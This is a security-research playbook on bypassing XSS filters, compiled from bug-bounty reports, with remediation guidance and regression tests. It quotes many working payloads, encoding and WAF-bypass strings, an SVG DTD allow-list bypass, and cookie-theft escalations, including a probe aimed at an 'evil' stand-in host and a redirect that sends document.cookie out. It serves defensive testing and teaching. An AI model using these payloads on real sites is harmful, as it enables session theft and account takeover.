---
title: "Filter Bypass and Encoding XSS"
type: playbook
category: filter-bypass-and-encoding
cwe: "CWE-79", "CWE-116", "CWE-172"
source_count: 38
full_bodies_available: 38
summary_only: 0
archive_accessed: 2026-10-12
---

# Filter Bypass and Encoding XSS

## 1. Overview

This playbook covers the reports where the application *did* attempt to stop XSS and
the attempt was defective. In every case the defence existed, was visible in the
output or the code, and was bypassable.

Three bypass families recur, and they require genuinely different testing methods:

1. **Context mismatch** — an encoder was applied, but not the one the output context
   demands. [`Reflected-XSS.md`](Reflected-XSS.md) §2.2.
2. **Encoding-layer mismatch** — double-encoding, or a filter that decodes and
   re-encodes inconsistently between request handling and response rendering.
3. **Filter incompleteness** — a blocklist that misses Unicode lookalikes, null
   bytes, entity tricks, or malformed markup.

All 38 sources in this group were retrieved **with full report bodies** — this is the
best-evidenced playbook in the knowledge base.

## 2. Root Cause and Technical Mechanics

### 2.1 Context mismatch (encoder ≠ context)

The application calls an encoder; it is simply the wrong one for where the value
lands.

| Case | Context | Failure |
| --- | --- | --- |
| `106293` FILT-017 (`wholesale.shopify.com`) | JS / script context | *"in script context the quotes, double quotes and `>` + `<` are not encoded at all"* |
| `190798` REFL-056 (Teavana) | single-quoted JS string | `'` unescaped |
| `189834` FILT-036 (Informatica) | `<a href='…'>` built from `document.URL` | client-side, no encoding at all |

The Shopify researcher's proposed remediation — *"convert them either to hex values or
escape them"* — is instructive as an **anti-pattern**. Hex-encoding is a
blacklist-shaped answer to an allow-list-shaped problem. Prefer a vetted,
context-specific encoder.

### 2.2 Double encoding

`REFL-082` (Rockstar Games, `246505`, medium, $500) is the dedicated case; its official
summary states the mechanism plainly: *"This exploit worked by using double-encoding to
bypass our filters."* See [`Reflected-XSS.md`](Reflected-XSS.md) §2.3 and note the
limitation recorded there — the body was withheld, so the precise decode sequence is a
testing hypothesis, not a documented fact.

### 2.3 Filter incompleteness — the richest sub-class here

This is where the archive is most informative, because teams described their own
failures in detail.

**Unicode lookalikes.** Rockstar `STOR-142`: *"we were not filtering **＜** and **＞**
characters the same as `<` and `>`."* Rockstar `STOR-143`: *"certain obscure
characters were not being converted to HTML entities properly"*, with the published
payload `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€`.

**Regex incompleteness on client-side filters.** Grab `DOM-020`'s `stripHtml` regex
`/<\/?\w+[^>]*\/?>/g` requires a word character after `<`; `<a/` and `<:` slip through.

**Structural incompleteness.** Concret5 `HTML-002` (`6843`): the
`$mp->getProductBlockID()` value in `getMarketplacePurchaseFrame()` was *"not being
filtered properly to protect against HTML injection/XSS"* — reachable at
`dashboard/extend/connect/"%20onmouseover="alert(document.cookie)">`. The reporter
supplied GitHub source links, which is the correct standard of evidence.

**Post-patch regression.** Grab `DOM-020` is explicitly a *bypass of an existing fix*:
*"This vulnerability wasn't properly patched so I managed to bypass the regular
expressioned that was added into the function."*

### 2.4 The validator/renderer differential

`STOR-144` (Shopify SVG, high, $5,000) belongs here too: a documented element and
attribute allow-list was disabled by an internal DTD `<!ENTITY>`, unmasking `onload`.
The control was well designed; the parser differential defeated it. See
[`Stored-XSS.md`](Stored-XSS.md) §7.

## 3. Attack Surface and Preconditions

| Surface | Case |
| --- | --- |
| URL/redirect paths | `REFL-001` (`2497`, Slack `/go/`), FILT-017 |
| UGC comment and profile fields | `STOR-142`, `STOR-143` |
| WordPress admin surfaces | FILT-021/035 (`126539`, `186462`, Shopify) |
| Legacy ASP endpoints | FILT-028 (`143323`, Informatica — `expression(prompt(1))` in an attribute, i.e. IE-only CSS expression) |
| Client-side filters | `DOM-020`, FILT-036 |
| SVG/XML uploads | `STOR-144` |
| Legacy message params | `2777` (Slack `auth.slack.com/generate/`, `u` param) |

**Preconditions:** usually none beyond loading a URL; for stored variants, a write
account. Bypass testing does not change the delivery mechanism — it changes only the
string you send.

## 4. Manual Testing Methodology

1. **Establish the baseline.** Send a plain `<script>alert(1)</script>` and confirm the
   filter fires. Without a working baseline you cannot demonstrate a *bypass*.
2. **Identify the filter's shape** before attacking it:
   - *Blocklist of characters* → test Unicode lookalikes, null bytes, control chars.
   - *Regex strip* → test inputs the regex does not match (unexpected leading char,
     unusual delimiters, nested markup).
   - *Blacklist of substrings* (`onerror=`, `alert`, `javascript:`) → test casing,
     whitespace, entity, and split-token variants.
   - *Allow-list parser* → test parser differentials (DTD/entities, CDATA, namespaces).
   - *One-shot encoder* → test double encoding and re-decoding paths.
3. **Test the encoder against the context**, not against the string. Ask: *given that
   this value lands inside `<a href='…'>`, does this encoder neutralise `'`?*
4. **Systematically vary one dimension at a time** — encoding depth (raw / URL-encoded
   / double-URL-encoded / HTML-entity-encoded), case, whitespace, and character
   repertoire. Record each combination in a table; bypasses hide in the grid.
5. **Test across *every* render site.** `STOR-142` and `STOR-143` are different fields
   with the same class of bug; `STOR-146`/`STOR-147` are sibling widgets with
   inconsistent filtering.
6. **Confirm a real bypass** by re-running the *original* blocked payload — it must
   still be blocked — then showing the variant executes. Otherwise a triager will
   reasonably call it a duplicate of the known filter.
7. **Document the filter's code path** if you can find it. `HTML-002` linked GitHub
   source; that materially shortened its triage.

## 5. Input and Output Context Analysis

Combine this playbook's filter axis with
[`Reflected-XSS.md`](Reflected-XSS.md) §5's context table. Filter-bypass questions
that matter most, by observed context:

| Context | Filter present | Bypass that matters |
| --- | --- | --- |
| JS string, single-quoted | HTML-escape only | unescaped `'` |
| `<a href='…'>` | HTML-escape only | `'`, or space+`on…` if unquoted |
| HTML attribute | char blocklist on `<>"'` | `＜` `＞` `＂` (U+FF1C/FF1E/FF02), or `%00` |
| `href` / URL | substring blocklist on `javascript:` | case, `&#106;`, leading control chars, `java\nscript:` |
| `<script>` block | string blocklist | `</script>` termination |
| HTML text | regex strip | non-matching leading char (`<a/`, `<:`) |
| XML/SVG | attribute allow-list | internal DTD entity |
| CSS (legacy IE) | none | `expression()` — see FILT-028 |

FILT-028 (`143323`, Informatica, high) is a distinct legacy case: the payload
`" style="width:expression(prompt(1))` is **CSS `expression()`**, an IE-only
construct. Modern browsers do not execute it. Report it as historical/legacy and
verify current behaviour before claiming impact.

## 6. Test Cases and Proof-of-Concepts

### 6.1 Historical payloads (verbatim from the cited reports)

Historical. For understanding only — do not replay against live targets.

| Case | Report | Payload as submitted |
| --- | --- | --- |
| FILT-017 | `106293` | `https://wholesale.shopify.com/asd';alert('XSS');'` |
| FILT-002 | `2777` | `u=<img src=x onerror=alert(1)>` |
| FILT-028 | `143323` | `PageLink=" style="width:expression(prompt(1))` |
| STOR-142 | `231389` | fullwidth `＜`/`＞` filter bypass (per team summary) |
| STOR-143 | `231444` | `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€` |
| DOM-020 | `247246` | `<a/:<"a">img src=# onerror=confirm('XSSED')>` |
| HTML-002 | `6843` | `dashboard/extend/connect/"%20onmouseover="alert(document.cookie)">` |
| STOR-144 | `232174` | `<!DOCTYPE svg [<!ENTITY elem "">]>` + `onload=` |

### 6.2 Newly authored illustrations (not from the archive)

**Filter-shape test matrix.** Newly authored. Run against targets you are authorised to
test, inert markers first.

```bash
# newly authored — encoding-depth grid for one parameter
BASE='https://TARGET/endpoint?p='
PAYLOAD='"><h1>xss-marker'

for enc in raw url doubleurl htmlentity mixedcase; do
  case $enc in
    raw)        v="$PAYLOAD" ;;
    url)        v=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD") ;;
    doubleurl)  v=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(urllib.parse.quote(sys.argv[1])))' "$PAYLOAD") ;;
    htmlentity) v='&#34;&gt;&lt;h1&gt;xss-marker' ;;
    mixedcase)  v='"><H1>XSS-MARKER' ;;
  esac
  echo "== $enc: ${BASE}${v}"
done
```

**Unicode lookalike probes** (newly authored; the *concept* is sourced from
`STOR-142`/`STOR-143`):

| Probe | Codepoint | Target |
| --- | --- | --- |
| `＜` | U+FF1C FULLWIDTH LESS-THAN | `<` |
| `＞` | U+FF1E FULLWIDTH GREATER-THAN | `>` |
| `＂` | U+FF02 FULLWIDTH QUOTATION MARK | `"` |
| `‹` | U+2039 SINGLE LEFT-POINTING ANGLE QUOTATION MARK | `<` |
| `›` | U+203A | `>` |
| `　` | U+3000 IDEOGRAPHIC SPACE | space |
| `%00` | NUL | terminator |

**Regex non-match probes** (derived from `DOM-020`'s failure): `<a/`, `<:`, `< x`,
`<3`, `</ x`, `<<h1>`.

**Scheme bypass probes** for `href`-style filters: `JaVaScRiPt:`, `java\tscript:`,
`&#106;avascript:`, `\x6aavascript:`, leading `\x01`.

**Escaping the filter — the golden rule.** A bypass report is only credible if you show
*both* halves:

1. `"><script>alert(1)</script>` → **blocked** (baseline)
2. the variant → **executes**

Without part 1, a reviewer cannot tell whether you bypassed a filter or simply found a
field nobody filtered.

## 7. Encoding, Filtering, and Parsing Behavior

Summarised across all 38 sources:

| Filter strategy | Observed failure | Bypass vector |
| --- | --- | --- |
| No filter | — | any payload |
| HTML-escape in non-HTML context | quote unescaped in JS string | `'`, `"` |
| ASCII blocklist on `<` `>` | fullwidth lookalikes reach the parser | `＜` `＞` |
| Partial entity conversion | obscure chars survive | mixed Unicode payload |
| Regex tag-strip | regex fails to match malformed tags | `<a/`, `<:` |
| Substring blocklist | alternate spellings | case, entities, whitespace |
| One-shot encode | decode/re-encode mismatch | double encoding |
| Allow-list parser | parser differential | internal DTD entity |
| Legacy browser feature | `expression()` (IE) | CSS, IE-only |

**The general lesson.** Every filter in this table failed because it operated on a
*different representation* of the payload than the browser's parser did. Blocking is a
statement about strings; execution is a statement about parse trees. Controls should be
built against the parse tree.

## 8. Impact and Severity Considerations

Filter-bypass XSS is rated exactly like the underlying XSS — the filter does not
reduce severity, because a bypassed filter means the protection was absent.

| Report | Program | Severity | Bounty |
| --- | --- | --- | --- |
| `232174` STOR-144 | Shopify | high | $5,000 |
| `189834` FILT-036 | Informatica | high | not disclosed |
| `143323` FILT-028 | Informatica | high | not disclosed |
| `246505` REFL-082 | Rockstar Games | medium | $500 |
| `186462` FILT-035 | Shopify | not disclosed | $500 |
| `126539` FILT-021 | Shopify | not disclosed | $500 |
| `2777` FILT-002 | Slack | not disclosed | $500 |

**Two honest-ceiling examples from this group.** `FILT-028` uses IE-only
`expression()`, and `HTML-010` (`198907`, VK.com) reported a filter weakness where the
researcher explicitly declined to claim XSS. Both constrain severity correctly.

**One inflation example.** `FILT-017`'s researcher proposed converting characters to
hex as a fix; had that been framed as a working mitigation it would have overstated
security. Report the defect, not a fix you have not verified.

## 9. False Positives and Limitations

- **A bypass of a *fix* is a new report; a bypass of a *known issue* is a duplicate.**
  `DOM-020` was accepted because it bypassed a patch; check the archive's "known issues"
  first — `STOR-035`'s researcher did exactly that and said so in the report.
- **Not all odd output is exploitable.** VK's `HTML-010` stored markup that parsed only
  before saving. Report the filter weakness; do not claim XSS you have not shown.
- **Encoding depth must match the server's stack.** Triple-encoding against a framework
  that decodes once is not a finding. Show the response.
- **Legacy payloads need modern verification.** `expression()`, `document.domain`
  quirks, and IE-specific parsing from 2013–2017 sources may no longer execute.
  Re-test and state your browser.
- **Unicode probes need a normalised request path.** Some frameworks normalise input
  before your filter runs, closing the gap. Verify against the live response.

## 10. Remediation and Regression Testing

### 10.1 Remediation

1. **Delete blocklist filters.** Replace them with context-aware output encoding.
2. **Encode at the sink, for every value, unconditionally**, using a vetted library —
   never hand-rolled, never hex.
3. **Pick the encoder by context** (see
   [`Reflected-XSS.md`](Reflected-XSS.md) §10.1). Prefer DOM APIs that make the
   question moot.
4. **Use an allow-list sanitiser** for rich text, configured per context, and keep it
   current.
5. **Validate the validator.** If you allow-list SVG/XML, parse with a hardened parser
   that rejects DTDs, or strip the file to a known-safe subset. Never regex-validate.
6. **Normalise before validating** — decide explicitly whether you filter on NFC,
   NFKC, or raw input, and test the lookalikes that survive your choice.
7. **Constrain input shape** as defence in depth (length, charset, no control chars).
8. **CSP without `unsafe-inline`** as defence in depth.

### 10.2 Regression tests

Every filter you replace deserves a test that would have caught the original bypass:

| Test | Asserts |
| --- | --- |
| Fullwidth `＜＞＂‹›` in every user-controlled field | ASCII-only filters cannot be reintroduced |
| `%00` and control characters | rejected or stripped |
| Double-URL-encoded payload | decodes to inert text, not markup |
| `<a/`, `<:`, `<<h1>` against any tag-stripping regex | regex matches or is gone |
| `<!DOCTYPE svg [<!ENTITY x "">]>` against any upload filter | DTD rejected |
| `JaVaScRiPt:` / `&#106;avascript:` / `java\tscript:` in URL fields | scheme allow-list holds |
| Baseline `<script>alert(1)</script>` | rejected by input validation, and separately escaped on output |
| Round-trip: input → stored → every render path | output encoding applied on read |

The last row is the one teams most often miss: input validation and output encoding are
different controls, and only the second one fixes XSS.

## 11. Historical Bug Bounty Case Studies

Sourced facts only. All sources in this playbook were retrieved with full bodies.
Inventory: [`references/source-index.md`](references/source-index.md).

---

### FILT-017 — Reflective XSS on wholesale.shopify.com

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/106293>
- **Archive listing:** <https://h1.security.nathan.sx/shopify.html>
- **Published:** 2015-12-21 · **Weakness:** `XSS - Generic` · **Bounty:** $500
- **Severity:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** `https://wholesale.shopify.com/` — reflection of a URL path
segment.

**Reproduction (as submitted):**
```
https://wholesale.shopify.com/asd';alert('XSS');'
```
Tested by the reporter in Mozilla Firefox; an alert box reading `XSS` appeared.

**Root cause, in the researcher's words:** *"The main problem with that XSS is, that
in script context the quotes, double quotes and `>` + `<` are not encoded at all."*

**Impact as claimed:** *"an attacker has full control of the scripts, that are executed
in the victims browser… As the victim trusts the domain wholesale.shopify.com, it will
click the link and could be redirected to a site hosting a browser exploit kit."*

**Proposed remediation (reporter's words):** *"I suggest to convert them either to hex
values or escape them."* Recorded here as historical; see §10.1 for why hex-encoding
is not recommended.

---

### FILT-002 — Reflected XSS on auth.slack.com/generate/

- **Program:** Slack · **Report:** <https://hackerone.com/reports/2777>
- **Archive listing:** <https://h1.security.nathan.sx/slack.html>
- **Published:** 2014-03-03 · **Weakness:** `XSS - Generic` · **Bounty:** $500
- **Severity:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `u` parameter on `https://auth.slack.com/generate/`.

**Reproduction (as submitted):**
1. Submit a username and password on the signup form.
2. On the password-confirmation step, re-enter the password and intercept the request.
3. Modify the `u` parameter to `u=<img src=x onerror=alert(1)>`.
4. Submit — *"the application does not properly escape the special char and hence xss
   got executed."*

**Root cause:** no escaping of the `u` parameter where it is rendered.
**Environment note (reporter):** *"For better reproduction use Firefox."*

**Worth noting:** this is an *authenticated-flow* parameter — the researcher had to
complete a signup before the reflection was reachable. Enumerate parameters in
post-auth flows, not just public ones.

---

### FILT-028 — XSS on uk.informatica.com

- **Program:** Informatica · **Report:** <https://hackerone.com/reports/143323>
- **Archive listing:** <https://h1.security.nathan.sx/informatica.html>
- **Weakness:** `XSS - Generic` · **Severity:** high · **Bounty:** Not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** `http://uk.informatica.com:80/o/Default.asp`. The reporter named
three vulnerable parameters: **`PageLink`, `ResponseHandlingLanguage`, `UID`**.

**Payload (as submitted):** `PageLink=" style="width:expression(prompt(1))`

**Methodological strength:** the report includes the **complete raw POST request**,
with `Content-Type`, `Cookie`, `Host`, and `User-Agent` headers, so any reviewer could
replay it verbatim.

**Legacy caveat — important.** `expression()` is a **CSS construct implemented only in
Internet Explorer** (through IE's dynamic properties, removed in IE 10 standards mode).
In any current browser this payload produces CSS and nothing more. Treat it as a
historical finding; re-test before claiming impact. This is exactly the kind of
limitation §9 asks you to state.

---

### STOR-142 / STOR-143 — Rockstar's Unicode filter failures

Covered in full in [`Stored-XSS.md`](Stored-XSS.md) §11 with verbatim team summaries.
Re-listed here because they are this playbook's strongest evidence:

- **STOR-142** `231389` — <https://hackerone.com/reports/231389> — medium, $1,000.
  Fullwidth `＜`/`＞` not filtered like ASCII.
- **STOR-143** `231444` — <https://hackerone.com/reports/231444> — medium, $1,000.
  Published payload `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€`.

Both had their bodies withheld; evidence level **partial report**. Both nonetheless
documented the root cause and (for STOR-143) the exact exploit string — unusually good
disclosure from a program that withheld the body.

---

### FILT-036 — DOM based XSS in the bindBreadCrumb function

- **Program:** Informatica · **Report:** <https://hackerone.com/reports/189834>
- **Archive listing:** <https://h1.security.nathan.sx/informatica.html>
- **Weakness:** `XSS - Generic` · **Severity:** high
- **Bounty / date:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `bindBreadCrumb()` function, invoked on `$(document).ready`
at `https://kb.informatica.com/solution/4/Pages/7377.aspx`.

**Vulnerable code (quoted verbatim in the report):**
```js
strChild = "<a href='" + document.URL + "' style='color:#fff !important;font-size:10px'>Search Results</a>";
strChild = "<a href='" + varCoveoSearchResultPageURL + "' style='color:#999 !important;' >Search Results</a>";
strChild = "<a href='" + varDocumentReferrer + "' style='color:#999 !important;' >Search Results</a>";
strChild = "<a href='" + varStaticCoveoSearchResultPageURL + "' style='color:#999 !important;' >Search Results</a>";
```

**Root cause:** URL-derived values are concatenated into markup **with no encoding**,
inside single-quoted `href` attributes.

**Why it matters here:** `document.URL` contains the **fragment**, so a payload placed
after `#` never touches the server and still executes. See
[`DOM-Based-XSS.md`](DOM-Based-XSS.md).

---

### Supporting filter-bypass sources (full bodies retrieved)

- **STOR-144** `232174` — <https://hackerone.com/reports/232174> — Shopify, high,
  $5,000. SVG allow-list bypassed by an internal DTD entity.
- **DOM-020** `247246` — <https://hackerone.com/reports/247246> — Grab, medium. Bypass
  of a previously added regex filter.
- **HTML-002** `6843` — <https://hackerone.com/reports/6843> — concrete5. Filter failure
  in `getMarketplacePurchaseFrame()`, with GitHub source links.
- **FILT-021** `126539` — <https://hackerone.com/reports/126539> — Shopify, $500.
  `signup=confirm(document.domain)` — a **boolean-based** injection, not even a tag
  break-out, proving no filtering at all on that parameter.
- **FILT-035** `186462` — <https://hackerone.com/reports/186462> — Shopify, $500. 'Buy
  Button' variant-title attribute.

### FirstBlood hackevent cases (BugBountyHunter.com · 2021-2023)

Four bypass chains against the same stored-XSS cancel-message surface on
`/api/ma.php` / `/drpanel/cancelled.php`, each defeating a different filter — catalogue:
[`references/firstblood-index.md`](references/firstblood-index.md):

- **FB-082** — <https://www.bugbountyhunter.com/hackevents/report?id=82> — FirstBlood
  v1 · **P1 CRITICAL**. Mixed-case **pointer-event handler** with URL-encoded space
  separators: ``ITWORKED"%20onpointereNTER="console.log`jtcsecwashere`"%20new="1``.
  Verify protocol (quoted): *"login as a doctor and hover over the name of your
  patient"*; escalation proof uses backtick-tagged eval —
  ``eval.call`${'confirm\x28document.cookie\x29'}`` displays the `drps` cookie:
  *"it is not being stored securely."*
- **FB-189** — report 189 — v1 · **P1 CRITICAL**. Server HTML-encodes `"` once, so the
  attacker pre-pays a second round: `%26quot;` → `&quot;` → live `"` breaking out of
  `value="abc"…`: ``abc"%26quot;%20onpointerenter=console.log`d20s84`>``.
- **FB-131** — report 131 — v1 · **P3 Medium**. Declared filter (quoted): encodes or
  replaces `"< > ( alert java javascript"`. Defeat: `ja%0dvascript:prompt%2528'1')` —
  CR splits the handler into `ja`+`vascript` and `%2528` is a **double-encoded `(`**;
  the escalation PoC is a fully double-encoded `eval()` XHR cookie exfil. Needs the
  *Return to previous page* click — documented inside the PoC URL.
- **FB-150** — report 150 — v1 · **P3 Medium**. `%0a` inserted *"between ja and va"*
  — *"I also found other bypasses such as %0d and %09"* — then
  ``window.location.href=`http://localhost/${document.cookie}` `` turns it into the
  account-takeover chain.

### BBH-001 — ZSeano's XSS filter-reconnaissance flow (BugBountyHunter.com methodology)

Written methodology, not a report — full page retrieved:
<https://www.bugbountyhunter.com/vulnerability/?type=xss>. Disciplinary content,
quoted from the page:

**Six-probe filter map** (run each and compare reflections):

1. `<h2>` vs `<script>` — *"h2 tags are usually not blacklisted. how are both
   handled?"*
2. `<script src=//evil/?c=` (unclosed) — *"Are they only looking for complete tags?
   Notice we don't end the HTML tag and append extra HTML as a parameter!"*
3. `</script/x>` — *"The trailing / closing the tag can sometimes break filters. I
   have high success rate with this."*
4. `<<h2>>` — *"may strip the outter < > leaving <h2>"* (sic).
5. `<IFRAME>` — *"is it case sensitive?"*
6. `"onxss=` — *"onxss= isn't valid. Does it error when using onerror= but not when
   onxss=?"* (differential probe for `on*` wildcard filtering).

**Reflection shape → first moves** (the page's Problems #1–#4):

| Reflection of `<script>alert(0)</script>` | Verdict | First moves |
| --- | --- | --- |
| only `alert(0)` survives | tag-name filtering | `<script src=//` (dangling); `<notreal>` custom tag; ``<notreal onpointerrawupdate=alert`0`>`` *"executes on Firefox"* |
| `&lt;script&gt;alert(0)&lt;/script&gt;` | encoded once, likely dead | *"do not rule it out"* — `%3Cscript%3E…`; pre-encoded `%26lt%3Bscript%26gt%3B…` *"The server may process it as valid HTML on response."* |
| only `"><script>` returns | partial filtering, hard | three-account comment-splitting (below) |
| `scriptalert(0)/` — all angle brackets stripped | attribute-level injection | `"onmouseover=alert(0)`, `"onfocus="alert(0)" k="`, `"onmousenter="alert(0)" k="` |

**Three-account comment-splitting** for length-limited stored fields: account 1 name
`<script>/*`, account 2 posts `*/ alert(0) /*`, account 3 name `*/</script>` —
*"Firstly, account THREE posts first since newest comments are at top"* — so the
rendered block opens the script, comments over the neighbours' text, executes the
middle comment, closes the comment and the script tag. *"When you have limited
characters available you need to get creative & see what options you have available."*

**`on*` wildcard defeats:** `on%0dmouseover=` (*"you can also use %09, %0C, %00
here"*), `"onmouseover%3D`, and `=`-terminated payloads (`onmouseover=alert(0)"=`).

**WAF notes:** `"<svg%0donload=prompt(1)>"` — *"the WAF is typically just looking for
certain strings"*; *"java%09script: will bypass CloudFlare WAF in certain cases"* —
matching the FB-131/FB-150 event evidence above.

**Impact checklist** (same page): non-HttpOnly cookie → *"Test using the leaked
session cookie on a fresh browser session and see if you authenticate!"*; obtain CSRF
tokens *"to perform an action"* (change email without confirmation); PII exfil
through weak `*.domain.com` CORS — links the zseano Apple.com concept PoC.

## 12. Professional Vulnerability Report Template

````markdown
# Filter bypass in <component> — <filter description> bypassed via <technique>

## Summary
<The control that exists, and precisely how the variant evades it.>

## Severity
<Rating as for the underlying XSS — a bypassed filter means no protection.>

## Affected endpoint
`GET|POST https://<host>/<path>` · Parameter: `<name>` · Program: <name>

## Vulnerability details
### The existing filter
<Where it lives, what it blocks, and the code if available.>

### Why it is bypassable
<Precise mechanism: regex non-match / Unicode lookalike / context mismatch / parser
differential / encoding depth.>

## Proof of concept
### Step 1 — baseline: the filter works
```
<parameter>=<original blocked payload>
```
> Result: **blocked / escaped.** (This proves a filter is present.)

### Step 2 — the bypass
```
<parameter>=<variant payload>
```
> Result: **executes in <origin>**. Screenshot / DOM excerpt attached.

### Step 3 — context confirmation
> Payload reads `document.domain` = `<origin>`.

## Remediation
<Context-appropriate output encoding; retire the blocklist. See §10.1.>

## Regression tests
<The specific probes that would have caught this bypass.>
````

**Reporting discipline — non-negotiable.** Always include the blocked baseline. Say
plainly that this is a bypass of an existing control, not a fresh injection point.
Include the filter's code if you can find it. Do not propose a fix you have not
verified — `FILT-017`'s hex-encoding suggestion is the cautionary example.

## 13. References

- OWASP Cheat Sheet — Input Validation: <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- OWASP Cheat Sheet — XSS Prevention: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP — Unicode normalisation guidance (Appendix in Input Validation sheet): <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- OWASP — Internationalization character encoding: <https://owasp.org/www-project-internationalization/>
- OWASP XML External Entity Prevention (for the SVG/DTD case): <https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html>
- Unicode code charts: <https://unicode.org/charts/>
- Reports cited: <https://hackerone.com/reports/106293>, <https://hackerone.com/reports/2777>,
  <https://hackerone.com/reports/143323>, <https://hackerone.com/reports/189834>,
  <https://hackerone.com/reports/232174>, <https://hackerone.com/reports/247246>,
  <https://hackerone.com/reports/6843>, <https://hackerone.com/reports/126539>,
  <https://hackerone.com/reports/186462>, <https://hackerone.com/reports/231389>,
  <https://hackerone.com/reports/231444>

## 14. Research Gaps and Further Investigation

- **`REFL-082` (double encoding) body withheld.** The exact decode sequence remains a
  hypothesis. Highest-value single gap in this playbook.
- **`STOR-142` endpoint undisclosed.** The team described the filter defect precisely
  but not where it lived. Needed to build a targeted regression test.
- **Untested in this knowledge base:** mXSS (mutation XSS) via HTML-parser
  round-trips; template-injection-as-XSS in server-side template engines; encoding
  differentials between reverse proxies and origin servers; HTTP/2 or header-level
  double-decoding. None of these are well covered by 2017-era public reports.
- **Unicode coverage is thin.** `＜＞` and `‰€` are documented; the broader question —
  how many normalisation forms an application's filter must handle to be sound — is
  not answered by any source here. Worth original research.
- **Suggested experiment:** for a given target, submit an identical payload across
  NFC / NFKC / NFD and observe whether validation and rendering diverge. That single
  test distinguishes a sound implementation from an accidentally-working one.
